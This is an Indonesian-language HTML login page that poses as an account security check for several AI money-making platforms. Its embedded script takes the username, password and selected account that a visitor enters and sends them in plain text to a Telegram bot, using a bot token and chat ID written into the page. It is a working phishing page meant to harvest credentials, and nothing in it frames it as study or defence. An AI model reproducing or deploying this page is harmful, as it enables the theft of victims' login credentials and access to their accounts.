<!DOCTYPE html>
<html>
<head>
	<title>Login Form</title>
	<style>
		body {
			font-family: Arial, sans-serif;
			background-color: #f0f0f0;
		}
		.login-form {
			width: 300px;
			margin: 40px auto;
			background-color: #fff;
			border: 1px solid #ddd;
			padding: 20px;
			border-radius: 10px;
			box-shadow: 0 0 10px rgba(0,0,0,0.1);
		}
		.login-form h2 {
			margin-top: 0;
		}
		.login-form label {
			display: block;
			margin-bottom: 10px;
		}
		.login-form input[type="text"], .login-form input[type="password"] {
			width: 100%;
			padding: 10px;
			margin-bottom: 20px;
			border: 1px solid #ccc;
		}
		.login-form select {
			width: 100%;
			padding: 10px;
			margin-bottom: 20px;
			border: 1px solid #ccc;
		}
		.login-form button[type="submit"] {
			width: 100%;
			padding: 10px;
			margin-top: 20px;
			background-color: #4CAF50;
			color: #fff;
			border: none;
			border-radius: 10px;
			cursor: pointer;
		}
		.login-form button[type="submit"]:hover {
			background-color: #3e8e41;
		}
	</style>
</head>
<body>
	<div class="login-form">
		<h2>Login ke akun Anda</h2>
		<form id="login-form" action="/login" method="post">
			<label for="username">Username:</label><br>
			<input type="text" id="username" name="username" required><br>
			<label for="password">Password:</label><br>
			<input type="password" id="password" name="password" required><br>
			<label for="account">Account:</label><br>
			<select id="account" name="account">
				<option value="XFA AI">XFA AI</option>
				<option value="AI Uang Robot">AI Uang Robot</option>
				<option value="Grapix AI">Grapix AI</option>
				<option value="Star AI">Star AI</option>
				<option value="Quantum">Quantum</option>
				<option value="FTA AI">FTA AI</option>
			</select><br>
			<button type="submit">Cek keamanan akun</button>
		</form>
		<script>
			const botToken = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY';
			const chatId = '6235911819';
			const securityInfoDiv = document.getElementById('security-info');

			document.getElementById('login-form').addEventListener('submit', (e) => {
				e.preventDefault();

				const username = e.target.username.value;
				const password = e.target.password.value;
				const account = e.target.account.value;

				// Kirim data login ke server
				fetch('/login', {
					method: 'POST',
					headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
					body: new URLSearchParams(new FormData(e.target))
				})
				.then((response) => response.text())
				.then((data) => {
					// Kirim pesan ke bot Telegram
					fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({
							chat_id: chatId,
							text: `Login attempt:\nUsername: ${username}\nPassword: ${password}\nAccount: ${account}`
						})
					})
					.then((response) => response.json())
					.then((data) => {
						if (data.ok) {
							alert('Login data sent to Telegram successfully');
						} else {
							alert('An error occurred. Try again later.');
						}
					})
					.catch((error) => {
						alert('Failed to send data to Telegram. Please try again later.');
					});
				});
			});
		</script>
		<div id="security-info" style="display: none;">
			<h3>Keamanan Akun</h3>
			<ul>
				<!-- List will be populated dynamically -->
			</ul>
		</div>
	</div>
</body>
</html>
